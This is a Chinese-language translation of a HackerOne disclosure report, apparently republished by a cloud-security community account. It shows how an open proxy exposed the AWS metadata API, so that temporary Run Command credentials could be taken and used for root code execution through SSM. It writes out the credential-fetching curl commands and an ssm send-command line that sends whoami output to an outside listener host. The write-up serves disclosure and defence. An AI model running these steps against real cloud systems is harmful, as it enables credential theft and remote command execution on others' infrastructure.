#  AWS：代理服务器上的远程代码执行（hackerone漏洞报告）   
原创 樱宁  火线Zone   2022-07-05 18:00  
  
本文为翻译文章，原文地址:https://hackerone.com/reports/401136  
  
  
  
介绍  
  
  
  
  
  
  
  
  
  
  
  
我在用于跟踪研究人员活动的代理服务上发现了这个远程代码执行 (RCE) 漏洞。这是我进一步了解 AWS 的机会，特别是 AWS EC2 Systems Manager 与开放元数据 API 相结合的危险。  
  
出于礼貌，我在披露之前将这篇文章发送给了该组织。不幸的是，官方明确要求匿名披露，因此需要大量编辑。尽管省略了一部分细节，但我认为这篇文章仍是很有价值的。  
  
  
  
漏洞细节  
  
  
  
  
  
  
  
  
  
  
  
为了方便研究人员进行访问，某些程序的代理服务允许访问 AWS 的元数据 API。该元数据 API 又被配置为公开 AWS EC2 Run Command 角色的临时 AWS 访问凭证。当此角色由 AWS 客户端（例如 CLI）承担时，可以在 AWS EC2 实例上执行任意命令。  
  
  
**获取AWS密钥**  
  
  
首先，我们将使用 curl 并证明 AWS 元数据 API 是可访问的：  
  
```
curl -vv http://169.254.169.254/latest/ -x '52.6.██.███:25603'
```  
  
  
我们利用 curl 通过代理加载 AWS 的元数据 API。由于代理托管在 AWS 上，并且不会阻止到内部 IP 的流量（例如此 API），因此我们能够访问它。  
  
要生成一对临时访问密钥，我们可以运行以下命令：  
  
```
curl -vv http://169.254.169.254/latest/meta-data/iam/security-credentials/runCommand -x '52.6.██.███:25603'
```  
  
  
这个runCommand角色很有趣，让我假设它被用于https://aws.amazon.com/ec2/run-command/。  
  
  
**配置 AWS CLI**  
  
  
首先需要安装一个AWS CLI，然后才能继续：  
  
设置一下环境变量：  
  
```
export AWS_ACCESS_KEY_ID=<"AccessKeyId" you exposed in the last cURL command>
export AWS_SECRET_ACCESS_KEY=<"SecretAccessKey" you exposed in the last cURL commandt>
export AWS_SESSION_TOKEN=<"Token" you exposed in the last cURL command>
```  
  
  
现在，在同一个 shell 会话中，您应该能够通过 CLI 与多个 AWS 服务进行交互。  
  
  
**以root身份执行任意命令**  
  
  
由于角色名称是runCommand我立即选择了 AWS EC2 Systems Manager（特别是aws ssm send-command）。  
  
配置访问密钥后，我运行以下 AWS CLI 命令来证明密钥确实具有足够的权限来执行任意命令：  
  
```
aws ssm send-command --instance-ids "i-05b████████adaa" --document-name "AWS-RunShellScript" --comment "whoami" --parameters commands='curl 162.243.███.███:8080/`whoami`' --output text --region=us-east-1
```  
  
  
在我的服务器上，我在端口 8080 ( nc -vvkl 8080) 上运行了一个 netcat 侦听器，以捕获传入的 curl 请求。  
  
我还选择执行一个快速whoami命令并将其作为 curl HTTP 调用中的路径传递，这样我就可以快速确认什么类型的用户正在执行这些命令。  
  
HTTP请求如下：  
  
```
Connection from [52.73.██.██] port 8080 [tcp/http-alt] accepted (family 2, sport 45163)
GET /root HTTP/1.1
User-Agent: curl/7.35.0
Host: 162.243.███.███:8080
Accept: */*
```  
  
  
这足以证明我可进行命令执行（这些命令以root身份执行的）。  
  
请注意，我只在一个实例上尝试过此操作，但我希望该us-east-1区域中有更多实例允许执行这种类型的命令（并且可能还有其他区域中的实例）。  
  
  
  
  
  
  
**【火线Zone云安全社区群】**  
  
进群可以与技术大佬互相交流  
  
进群有机会免费领取节假日礼品  
  
进群可以免费观看技术分享直播  
  
识别二维码回复**【社区群】**进群  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaTf5R6lHvwO5WVsDRNyynwGQLM4tsY4nTvLyBeGWOtv4GficOaAWl9lhop3l4o7zahn4ib4R5YsW7QQ/640?wx_fmt=jpeg "")  
  
  
**【相关精选文章】**  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247495885&idx=1&sn=585b0ccd99103e60ffc83826e4d367e5&chksm=eaa978eddddef1fb0817487ea6dbff8f840b3766bc19d2e85a925e1a3c0463945943b2cf304d&scene=21#wechat_redirect)  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247495851&idx=1&sn=93bd8403416a300da9a76241865addc2&chksm=eaa9788bdddef19d6567abdcd3f91f7f8719054d30c9bd2a63b46f2fe9dd7ec94f38cb1df166&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTf5R6lHvwO5WVsDRNyynwGicdWbB2xBTFib0XzJO1ertfuF3jocicHB88Zxn0cfhATzCLHicKju6EaLw/640?wx_fmt=png "")  
  
火线Zone是[火线安全平台]运营的云安全社区，内容涵盖云计算、云安全、漏洞分析、攻防等热门主题，研究讨论云安全相关技术，助力所有云上用户实现全面的安全防护。欢迎具备分享和探索精神的云上用户加入火线Zone社区，共建一个云安全优质社区！  
  
如需转载火线Zone公众号内的文章请联系火线小助手：hxanquan（微信）  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaTf5R6lHvwO5WVsDRNyynwG1OK03VUOHaicOibhdUZUxesnic7VYym0AxpYHDHMVghddk29FTUzjbFAw/640?wx_fmt=jpeg "")  
  
//  火线Zone  
   
//  
  
微信号 : huoxian_zone  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/CkzQxaHZX9KdW919vwagVwhCeicQPXuMGibHcf2WqiaFyvfy5p1oIk1C5SOdtTyLlQmOtEia7FMKicknJzGTmYLWb2Q/640?wx_fmt=gif "")  
  
点击阅读原文，加入社区，共建一个有技术氛围的优质社区！  
